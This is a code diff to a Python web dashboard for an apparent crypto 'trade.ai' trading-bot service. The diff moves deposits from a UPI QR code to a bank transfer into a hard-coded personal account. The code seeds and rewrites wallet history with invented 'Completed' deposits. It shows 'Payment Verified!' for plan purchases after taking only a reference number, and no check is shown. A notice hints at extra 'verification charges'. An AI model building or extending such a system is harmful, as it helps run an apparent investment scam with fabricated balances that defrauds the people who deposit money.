@@ -11,10 +11,14 @@ DB_FILE = 'trades.json'
 coins = ['BTC/USDT', 'ETH/USDT', 'SOL/USDT']
 exchange = ccxt.binance()
 
-# Aapki UPI Details
+# Aapki Bank Details (Bot Investment Deposit ke liye)
+BANK_NAME = "India Post Payments Bank"
+ACCOUNT_NUMBER = "021210215499"
+IFSC_CODE = "IPOS0000001"
+
+# Subscription Plans ke liye UPI Details
 MY_UPI_ID = "8406012453-2@ibl"
 PAYEE_NAME = "trade.ai"
-PLAN_PRICE_INR = 999
 USDT_INR_RATE = 91.50
 
 MIN_WITHDRAW_INR = 1000.0
@@ -22,10 +26,6 @@ MAX_WITHDRAW_INR = 10000.0
 
 ADMIN_COMMISSION_PCT = 0.15
 USER_SHARE_PCT = 0.85
-
-# QR & Deep Link URLs
-upi_intent_url = f"upi://pay?pa={MY_UPI_ID}&pn={urllib.parse.quote(PAYEE_NAME)}&am={PLAN_PRICE_INR}&cu=INR&tn={urllib.parse.quote('trade.ai Bot Deposit')}"
-qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=220x220&data={urllib.parse.quote(upi_intent_url)}"
 
 PLANS = {
     "PREMIUM": {"name": "PREMIUM PACKAGE", "price": 8000, "days": 365, "badge": "BEST VALUE (1 YEAR)"},
@@ -42,7 +42,7 @@ autopilot_state = {
 def load_db():
     default_expiry = (datetime.now() + timedelta(days=30)).strftime("%d %b %Y")
     real_initial_activity = [
-        {"date": "04 Sep 2026", "time": "09:00 pm", "type": "INR Deposit (UPI)", "category": "DEPOSIT", "amount_inr": 999.0, "status": "Completed"}
+        {"date": "04 Sep 2026", "time": "09:00 pm", "type": "INR Deposit (Bank Transfer)", "category": "DEPOSIT", "amount_inr": 1000.0, "status": "Completed"}
     ]
     if os.path.exists(DB_FILE):
         with open(DB_FILE, 'r') as f:
@@ -56,9 +56,9 @@ def load_db():
                         clean_list.append({
                             "date": w.get("date", "04 Sep 2026"),
                             "time": w.get("time", "09:00 pm"),
-                            "type": "INR Deposit (UPI)",
+                            "type": "INR Deposit (Bank Transfer)",
                             "category": "DEPOSIT",
-                            "amount_inr": 999.0,
+                            "amount_inr": 1000.0,
                             "status": "Completed"
                         })
                     elif abs(w.get("amount", 0)) not in [2600.0, 600.0, 200.0]:
@@ -232,7 +232,7 @@ def get_html():
                 <div>
                     <div style="font-size: 13px; color: #f8fafc; font-weight: 600;">{w.get('date', '')}</div>
                     <div style="font-size: 11px; color: #71717a; margin-top: 2px;">{w.get('time', '')}</div>
-                    <div style="font-size: 13px; color: #38bdf8; margin-top: 6px; font-weight: 600;">INR Deposit (UPI)</div>
+                    <div style="font-size: 13px; color: #38bdf8; margin-top: 6px; font-weight: 600;">{w.get('type', 'INR Deposit')}</div>
                 </div>
                 <div style="text-align: right;">
                     <div style="font-size: 16px; font-weight: 800; color: #34d399;">+₹{abs(amt_inr):,.2f}</div>
@@ -405,6 +405,7 @@ def get_html():
         .summary-label {{ font-size: 11px; color: #94a3b8; font-weight: 600; text-transform: uppercase; }}
         .summary-val {{ font-size: 18px; font-weight: 800; margin-top: 4px; }}
 
+        /* 3 Options Bar */
         .wallet-actions-bar {{ display: flex; gap: 10px; margin-bottom: 24px; }}
         .wallet-action-pill {{ flex: 1; text-align: center; background: #0c1527; border: 1px solid #16233b; border-radius: 20px; padding: 10px 14px; color: #94a3b8; font-size: 13px; font-weight: 700; cursor: pointer; white-space: nowrap; }}
         .wallet-action-pill.active {{ background: #38bdf8; color: #060b14; }}
@@ -412,21 +413,28 @@ def get_html():
         .notice-box {{ background: rgba(56, 189, 248, 0.06); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 14px; padding: 14px 18px; margin-bottom: 20px; color: #94a3b8; font-size: 12px; line-height: 1.5; text-align: left; }}
         .step-indicator {{ display: flex; align-items: center; gap: 10px; margin-bottom: 18px; font-size: 12px; font-weight: 700; color: #64748b; }}
         .step-circle {{ width: 22px; height: 22px; border-radius: 50%; background: #0284c7; color: white; display: flex; align-items: center; justify-content: center; font-size: 11px; }}
-        .payment-method-card {{ background: #0c1527; border: 1px solid #16233b; border-radius: 16px; padding: 20px; margin-bottom: 14px; text-align: left; }}
+        
+        /* Bank Transfer Card Styles (Screenshot 60) */
+        .bank-card {{ background: #0c1527; border: 1px solid #16233b; border-radius: 20px; padding: 24px; margin-bottom: 20px; text-align: left; }}
+        .bank-header {{ display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }}
+        .bank-icon-box {{ background: #0b1a2f; border: 1px solid #1e293b; width: 42px; height: 42px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }}
+        .badge-rec {{ background: #064e3b; color: #34d399; border: 1px solid #059669; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 800; text-transform: uppercase; margin-left: 8px; }}
+        .feature-pills {{ display: flex; gap: 8px; margin: 14px 0 20px; }}
+        .feat-tag {{ background: #060b14; border: 1px solid #1e293b; border-radius: 8px; padding: 4px 10px; font-size: 11px; font-weight: 600; color: #94a3b8; }}
 
-        .swap-box {{ background: #070d18; border: 1px solid #16233b; border-radius: 16px; padding: 18px; margin-bottom: 12px; }}
-        .swap-label-row {{ display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; margin-bottom: 10px; font-weight: 600; }}
-        .swap-input-row {{ display: flex; justify-content: space-between; align-items: center; gap: 12px; }}
-        .swap-input {{ background: transparent; border: none; color: #ffffff; font-size: 26px; font-weight: 800; width: 60%; outline: none; }}
-        .max-pill {{ background: rgba(56,189,248,0.15); border: 1px solid #0284c7; color: #38bdf8; padding: 4px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; }}
-        .curr-pill {{ background: #0c1527; border: 1px solid #1e293b; color: #ffffff; padding: 8px 14px; border-radius: 10px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px; }}
-        .swap-divider-btn {{ width: 40px; height: 40px; border-radius: 50%; background: #131b2e; border: 1px solid #1e293b; color: #38bdf8; display: flex; justify-content: center; align-items: center; font-size: 16px; margin: -6px auto; cursor: pointer; position: relative; z-index: 2; transition: 0.2s; }}
-        .calc-breakdown {{ padding: 16px 4px; border-top: 1px solid #16233b; margin-top: 14px; }}
-        .breakdown-row {{ display: flex; justify-content: space-between; font-size: 12px; color: #94a3b8; margin-bottom: 8px; }}
+        .bank-row {{ border-top: 1px solid #16233b; padding: 14px 0; display: flex; justify-content: space-between; align-items: center; }}
+        .bank-row-label {{ font-size: 10px; font-weight: 800; color: #64748b; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 4px; }}
+        .bank-row-val {{ font-size: 15px; font-weight: 800; color: #ffffff; font-family: monospace; letter-spacing: 0.5px; }}
+        .copy-icon-btn {{ cursor: pointer; color: #94a3b8; font-size: 16px; transition: 0.2s; background: transparent; border: none; }}
+        .copy-icon-btn:hover {{ color: #38bdf8; }}
+
+        /* Proof Submission Card (Screenshot 61) */
+        .proof-upload-box {{ border: 2px dashed #1e293b; border-radius: 16px; padding: 28px 16px; text-align: center; cursor: pointer; margin: 14px 0 20px; background: #070d18; transition: 0.2s; }}
+        .proof-upload-box:hover {{ border-color: #38bdf8; }}
 
         .modal {{ display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(6,11,20,0.92); justify-content: center; align-items: center; z-index: 100; padding: 16px; }}
         .modal-content {{ background: #0c1527; border: 1px solid #1e293b; border-radius: 20px; width: 100%; max-width: 420px; padding: 24px; text-align: center; }}
-        .input-box {{ width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #1e293b; background: #060b14; color: white; margin-bottom: 10px; font-size: 14px; }}
+        .input-box {{ width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #1e293b; background: #060b14; color: white; margin-bottom: 12px; font-size: 14px; }}
         .btn-action {{ background: #0284c7; color: #ffffff; border: none; width: 100%; padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer; }}
         .btn-close {{ background: transparent; color: #64748b; border: none; margin-top: 10px; cursor: pointer; font-size: 13px; }}
 
@@ -548,7 +556,7 @@ def get_html():
             {plans_html}
         </div>
 
-        <!-- TAB 3: BOT Wallet View (3 Options: DEPOSIT, WITHDRAW, CONVERSION with Personal Histories) -->
+        <!-- TAB 3: BOT Wallet View (Strictly 3 Options: DEPOSIT, WITHDRAW, CONVERSION) -->
         <div id="viewBotWallet" style="display: none;">
             <div class="card-position" style="padding: 22px 24px; margin-bottom: 20px;">
                 <div class="card-glow"></div>
@@ -567,41 +575,123 @@ def get_html():
                 </div>
             </div>
 
-            <!-- Action Pills Bar - Strictly 3 Options -->
             <div class="wallet-actions-bar">
                 <button id="pillDeposit" class="wallet-action-pill active" onclick="switchWalletTab('deposit')">↙ DEPOSIT • INR ▾</button>
                 <button id="pillWithdraw" class="wallet-action-pill" onclick="switchWalletTab('withdraw')">↗ WITHDRAW • INR ▾</button>
                 <button id="pillConversion" class="wallet-action-pill" onclick="switchWalletTab('conversion')">⇄ CONVERSION</button>
             </div>
 
-            <!-- Sub-tab 1: Deposit INR (Form + Pure INR Deposit History) -->
+            <!-- Sub-tab 1: Deposit INR (Bank Transfer Flow - Exactly Screenshots 60 & 61) -->
             <div id="walletSubDeposit">
                 <div class="step-indicator">
-                    <span class="step-circle">1</span> <span>PAYMENT DETAILS</span> ────── <span class="step-circle" style="background:#1e293b; color:#94a3b8;">2</span> <span>SUBMIT PROOF</span>
+                    <span class="step-circle" id="stepCircle1">1</span> <span id="stepLabel1" style="color: #ffffff;">PAYMENT DETAILS</span> ────── <span class="step-circle" id="stepCircle2" style="background:#1e293b; color:#94a3b8;">2</span> <span id="stepLabel2">SUBMIT PROOF</span>
                 </div>
 
-                <h2 style="font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px;">Deposit INR</h2>
-                <p style="font-size: 12px; color: #94a3b8; margin-bottom: 18px; line-height: 1.4;">
-                    Choose your preferred payment method to fund your bot trading wallet. All payments are manually verified for security purposes.
-                </p>
-
-                <div class="notice-box">
-                    ⚠️ For smooth and fast approval, please transfer funds only from the bank account used during your KYC verification.
-                </div>
-
-                <div class="payment-method-card">
-                    <div style="text-align: center; margin: 12px 0;">
-                        <div style="background: white; padding: 8px; border-radius: 12px; display: inline-block;">
-                            <img id="depositQrImg" src="{qr_image_url}" alt="UPI QR Code" style="width: 160px; height: 160px; display: block;">
-                        </div>
-                        <div style="font-family: monospace; color: #38bdf8; font-size: 13px; margin-top: 8px;">UPI ID: {MY_UPI_ID}</div>
+                <!-- STEP 1: Bank Transfer Details (Screenshot 60) -->
+                <div id="depositStep1">
+                    <div class="notice-box" style="border-color: #eab308; background: rgba(234, 179, 8, 0.08); color: #fde047;">
+                        ⚠️ For smooth and fast approval, please transfer funds only from the bank account used during your KYC verification. Payments made from third-party accounts may attract additional verification charges or could be delayed.
                     </div>
-                    <a id="depositIntentBtn" href="{upi_intent_url}" class="pill-btn-wide" style="background: #0284c7; color: white; text-decoration: none; font-weight: 700; margin-bottom: 14px; text-align: center;">📱 Open Google Pay / PhonePe (Pay ₹999)</a>
-                    <input id="depositUtrInput" type="text" class="input-box" placeholder="Enter 12-digit UTR No. after payment">
-                    <button class="btn-action" style="background: #10b981;" onclick="submitDepositUtr()">Submit Proof & Verify</button>
+
+                    <div class="bank-card">
+                        <div class="bank-header">
+                            <div class="bank-icon-box">🏛️</div>
+                            <div>
+                                <div style="display: flex; align-items: center;">
+                                    <strong style="font-size: 18px; color: #ffffff;">Bank Transfer</strong>
+                                    <span class="badge-rec">RECOMMENDED</span>
+                                </div>
+                                <div style="font-size: 12px; color: #94a3b8; margin-top: 2px;">NEFT • RTGS • IMPS</div>
+                            </div>
+                        </div>
+
+                        <p style="font-size: 12px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px;">
+                            Supports all major Indian banks with real-time or scheduled transfers. Ideal for large transactions with secure settlement and a verified payment flow.
+                        </p>
+
+                        <div class="feature-pills">
+                            <span class="feat-tag">🛡️ Secure</span>
+                            <span class="feat-tag">Trusted</span>
+                            <span class="feat-tag">High Limit</span>
+                        </div>
+
+                        <div class="bank-row">
+                            <div>
+                                <div class="bank-row-label">ACCOUNT HOLDER / BANK</div>
+                                <div class="bank-row-val">{BANK_NAME}</div>
+                            </div>
+                            <button class="copy-icon-btn" onclick="copyText('{BANK_NAME}')" title="Copy">📋</button>
+                        </div>
+
+                        <div class="bank-row">
+                            <div>
+                                <div class="bank-row-label">ACCOUNT NUMBER</div>
+                                <div class="bank-row-val">{ACCOUNT_NUMBER}</div>
+                            </div>
+                            <button class="copy-icon-btn" onclick="copyText('{ACCOUNT_NUMBER}')" title="Copy">📋</button>
+                        </div>
+
+                        <div class="bank-row">
+                            <div>
+                                <div class="bank-row-label">IFSC CODE</div>
+                                <div class="bank-row-val">{IFSC_CODE}</div>
+                            </div>
+                            <button class="copy-icon-btn" onclick="copyText('{IFSC_CODE}')" title="Copy">📋</button>
+                        </div>
+
+                        <div class="notice-box" style="margin-top: 18px; margin-bottom: 20px;">
+                            Please transfer the <strong>exact amount</strong> from your registered bank account to avoid delays. Ensure the account holder name matches your verified details. Transactions from third-party accounts may be rejected.<br><br>
+                            Once the payment is successfully completed, click the button below to proceed.
+                        </div>
+
+                        <button class="btn-action" style="background: linear-gradient(90deg, #10b981, #059669); padding: 14px; font-size: 15px;" onclick="goToDepositStep(2)">
+                            I Have Completed Payment
+                        </button>
+                    </div>
                 </div>
 
-                <!-- Pure INR Deposit History -->
+                <!-- STEP 2: Submit Payment Proof (Screenshot 61) -->
+                <div id="depositStep2" style="display: none;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                        <h2 style="font-size: 22px; font-weight: 800; color: #ffffff;">Submit Payment Proof</h2>
+                        <button onclick="goToDepositStep(1)" style="background: transparent; border: 1px solid #1e293b; color: #94a3b8; padding: 6px 12px; border-radius: 8px; font-size: 12px; cursor: pointer;">← Back</button>
+                    </div>
+                    <p style="font-size: 12px; color: #94a3b8; margin-bottom: 18px;">
+                        Fill in the transfer details exactly as they appear on your bank receipt.
+                    </p>
+
+                    <div class="payment-method-card">
+                        <label style="font-size: 12px; color: #94a3b8; margin-bottom: 6px; display: block; font-weight: 700;">Sender Account Holder Name</label>
+                        <input id="proofSenderName" type="text" class="input-box" placeholder="Enter sender name (same as bank/UPI used)">
+
+                        <label style="font-size: 12px; color: #94a3b8; margin-bottom: 6px; display: block; font-weight: 700;">Amount Paid (INR)</label>
+                        <input id="proofAmountInr" type="number" class="input-box" placeholder="₹ Enter exact transferred amount">
+
+                        <label style="font-size: 12px; color: #94a3b8; margin-bottom: 6px; display: block; font-weight: 700;">UTR / Transaction Reference Number</label>
+                        <input id="proofUtr" type="text" class="input-box" placeholder="Enter transaction / UTR number">
+
+                        <label style="font-size: 12px; color: #94a3b8; margin-bottom: 6px; display: block; font-weight: 700;">Upload Payment Screenshot</label>
+                        <div class="proof-upload-box" onclick="document.getElementById('proofFileInput').click()">
+                            <input type="file" id="proofFileInput" style="display: none;" onchange="handleFileSelected(this)">
+                            <div style="font-size: 28px; margin-bottom: 8px;">📤</div>
+                            <div id="uploadBoxLabel" style="font-size: 13px; color: #f8fafc; font-weight: 700;">Click to upload screenshot</div>
+                            <div style="font-size: 11px; color: #64748b; margin-top: 4px;">JPG, PNG, JPEG - up to 5MB</div>
+                        </div>
+
+                        <div class="notice-box" style="border-color: #eab308; background: rgba(234, 179, 8, 0.08); color: #fde047; margin-bottom: 18px;">
+                            After submission, our finance team will manually verify your payment. Approval usually takes up to 24 hours.<br>
+                            • Payment is made from your KYC verified account<br>
+                            • UTR number is correct<br>
+                            • Screenshot is clear and readable
+                        </div>
+
+                        <button class="btn-action" style="background: #10b981; padding: 14px; font-size: 15px;" onclick="submitBankDepositProof()">
+                            Submit Payment Proof
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Personal Deposit History (In Pure INR) -->
                 <div style="margin-top: 28px;">
                     <h3 style="font-size: 17px; font-weight: 800; color: #ffffff; margin-bottom: 14px;">Deposit History</h3>
                     <div id="personalDepositList">
@@ -629,7 +719,6 @@ def get_html():
                     <button class="btn-action" style="background: #ef4444; padding: 14px; font-size: 15px; margin-top: 6px;" onclick="submitWithdrawalInr()">Request Withdrawal (INR)</button>
                 </div>
 
-                <!-- Pure INR Withdrawal History -->
                 <div style="margin-top: 28px;">
                     <h3 style="font-size: 17px; font-weight: 800; color: #ffffff; margin-bottom: 14px;">Withdrawal History</h3>
                     <div id="personalWithdrawList">
@@ -706,7 +795,6 @@ def get_html():
                     <button class="btn-action" style="background: linear-gradient(90deg, #10b981, #059669); margin-top: 14px; padding: 14px; font-size: 16px;" onclick="executeConversion()">Convert</button>
                 </div>
 
-                <!-- Personal Conversion History -->
                 <div style="margin-top: 28px;">
                     <h3 style="font-size: 17px; font-weight: 800; color: #ffffff; margin-bottom: 14px;">Conversion History</h3>
                     <div id="personalConversionList">
@@ -716,7 +804,7 @@ def get_html():
             </div>
         </div>
 
-        <!-- TAB 4: Overview / Bot Wallet Activity (Pure INR Summary) -->
+        <!-- TAB 4: Overview / Bot Wallet Activity -->
         <div id="viewOverview" style="display: none;">
             <div style="margin-bottom: 20px;">
                 <h2 style="font-size: 24px; font-weight: 800; color: #ffffff; margin-bottom: 6px;">Bot Wallet Activity</h2>
@@ -769,7 +857,7 @@ def get_html():
         </div>
     </div>
 
-    <!-- Dynamic Plan Checkout Modal -->
+    <!-- Plan Checkout Modal (For Plans Tab) -->
     <div id="payModal" class="modal">
         <div class="modal-content">
             <h3 id="modalPlanTitle" style="color: #38bdf8;">Plan Activation</h3>
@@ -835,6 +923,58 @@ def get_html():
                 checkUserPlanStatus(saved);
             }}
         }});
+
+        function copyText(text) {{
+            navigator.clipboard.writeText(text);
+            alert('Copied to clipboard: ' + text);
+        }}
+
+        function goToDepositStep(step) {{
+            if (step === 2) {{
+                document.getElementById('depositStep1').style.display = 'none';
+                document.getElementById('depositStep2').style.display = 'block';
+                document.getElementById('stepCircle2').style.background = '#0284c7';
+                document.getElementById('stepCircle2').style.color = 'white';
+                document.getElementById('stepLabel2').style.color = '#ffffff';
+            }} else {{
+                document.getElementById('depositStep2').style.display = 'none';
+                document.getElementById('depositStep1').style.display = 'block';
+                document.getElementById('stepCircle2').style.background = '#1e293b';
+                document.getElementById('stepCircle2').style.color = '#94a3b8';
+                document.getElementById('stepLabel2').style.color = '#64748b';
+            }}
+        }}
+
+        function handleFileSelected(input) {{
+            if (input.files && input.files[0]) {{
+                document.getElementById('uploadBoxLabel').innerText = 'Selected: ' + input.files[0].name;
+            }}
+        }}
+
+        async function submitBankDepositProof() {{
+            const name = document.getElementById('proofSenderName').value.trim();
+            const amt = parseFloat(document.getElementById('proofAmountInr').value) || 0;
+            const utr = document.getElementById('proofUtr').value.trim();
+
+            if (!name) {{ alert('Please enter Sender Account Holder Name'); return; }}
+            if (amt <= 0) {{ alert('Please enter valid transferred amount'); return; }}
+            if (!utr || utr.length < 6) {{ alert('Please enter valid 12-digit UTR No.'); return; }}
+
+            const email = localStorage.getItem('cryptobot_user_email') || 'User';
+            const res = await fetch('/api/deposit-inr', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json' }},
+                body: JSON.stringify({{
+                    sender_name: name,
+                    amount_inr: amt,
+                    utr: utr,
+                    email: email
+                }})
+            }});
+            const data = await res.json();
+            alert(data.message);
+            window.location.reload();
+        }}
 
         async function checkUserPlanStatus(email) {{
             try {{
@@ -982,12 +1122,8 @@ def get_html():
             document.getElementById('payModal').style.display = 'flex';
         }}
 
-        function openPaymentModal() {{
-            showTab('plans');
-        }}
-        function closePaymentModal() {{
-            document.getElementById('payModal').style.display = 'none';
-        }}
+        function openPaymentModal() {{ showTab('plans'); }}
+        function closePaymentModal() {{ document.getElementById('payModal').style.display = 'none'; }}
 
         async function submitPlanPayment() {{
             const utr = document.getElementById('planUtrInput').value.trim();
@@ -1156,24 +1292,6 @@ def get_html():
 
         function openProfileModal() {{ document.getElementById('profileModal').style.display = 'flex'; }}
         function closeProfileModal() {{ document.getElementById('profileModal').style.display = 'none'; }}
-
-        async function submitDepositUtr() {{
-            const utr = document.getElementById('depositUtrInput').value.trim();
-            if (!utr || utr.length < 6) {{ alert('❌ Please enter 12-digit UTR Number!'); return; }}
-            const email = localStorage.getItem('cryptobot_user_email') || 'User';
-            const res = await fetch('/api/deposit-inr', {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json' }},
-                body: JSON.stringify({{
-                    amount_inr: 999.0,
-                    utr: utr,
-                    email: email
-                }})
-            }});
-            const data = await res.json();
-            alert(data.message);
-            window.location.reload();
-        }}
     </script>
 </body>
 </html>
@@ -1255,24 +1373,25 @@ class DashboardHandler(BaseHTTPRequestHandler):
         elif self.path == '/api/deposit-inr':
             db = load_db()
             email = payload.get('email', 'User')
+            sender_name = payload.get('sender_name', '')
+            amount_inr = float(payload.get('amount_inr', 0.0))
             utr = payload.get('utr', 'N/A')
-            amount_inr = float(payload.get('amount_inr', 999.0))
             now = datetime.now()
 
             db.setdefault("wallet_activity", []).insert(0, {
                 "date": now.strftime("%d %b %Y"),
                 "time": now.strftime("%I:%M %p").lower(),
-                "type": "INR Deposit (UPI)",
+                "type": f"INR Deposit ({sender_name})",
                 "category": "DEPOSIT",
                 "amount_inr": amount_inr,
                 "utr": utr,
-                "status": "Completed"
+                "status": "Pending Verification"
             })
             save_db(db)
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            msg = f"✅ Deposit Proof Submitted!\n₹{amount_inr:,.2f} deposit verified successfully."
+            msg = f"✅ Payment Proof Submitted!\n\nAmount: ₹{amount_inr:,.2f}\nUTR: {utr}\nFinance team verify karke aapke BOT Wallet me funds add kar degi."
             self.wfile.write(json.dumps({"status": "success", "message": msg}).encode('utf-8'))
 
         elif self.path == '/api/verify-plan-utr':
@@ -1292,21 +1411,11 @@ class DashboardHandler(BaseHTTPRequestHandler):
                 db["users"][email]["days_left"] = days
                 db["users"][email]["expires_on"] = expiry
 
-            now = datetime.now()
-            db.setdefault("wallet_activity", []).insert(0, {
-                "date": now.strftime("%d %b %Y"),
-                "time": now.strftime("%I:%M %p").lower(),
-                "type": f"Plan Payment ({plan_name})",
-                "category": "DEPOSIT",
-                "amount_inr": float(price),
-                "utr": utr,
-                "status": "Completed"
-            })
             save_db(db)
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            msg = f"🎉 Payment Verified!\n\n{plan_name} (₹{price:,}) successfully activate ho gaya hai!\nValidity: {days} Days (Till {expiry})."
+            msg = f"🎉 Payment Verified!\n\n{plan_name} (₹{price:,}) activate ho gaya hai!\nValidity: {days} Days (Till {expiry})."
             self.wfile.write(json.dumps({"status": "success", "message": msg}).encode('utf-8'))
 
         elif self.path == '/api/withdraw-inr':
